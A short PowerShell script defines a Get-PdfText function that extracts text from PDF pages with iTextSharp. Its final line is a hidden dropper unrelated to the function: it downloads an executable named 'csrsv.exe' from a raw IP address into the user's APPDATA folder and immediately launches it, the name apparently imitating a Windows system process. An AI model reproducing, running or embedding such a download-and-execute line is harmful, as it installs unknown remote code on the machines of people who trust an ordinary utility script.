



function Get-PdfText
{
    [CmdletBinding()]
    [OutputType([string])]
    param (
        [Parameter(Mandatory = $true)]
        [string]
        $Path
    )

    $Path = $PSCmdlet.GetUnresolvedProviderPathFromPSPath($Path)

    try
    {
        $reader = New-Object iTextSharp.text.pdf.pdfreader -ArgumentList $Path
    }
    catch
    {
        throw
    }

    $stringBuilder = New-Object System.Text.StringBuilder

    for ($page = 1; $page -le $reader.NumberOfPages; $page++)
    {
        $text = [iTextSharp.text.pdf.parser.PdfTextExtractor]::GetTextFromPage($reader, $page)
        $null = $stringBuilder.AppendLine($text) 
    }

    $reader.Close()

    return $stringBuilder.ToString()
}

(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

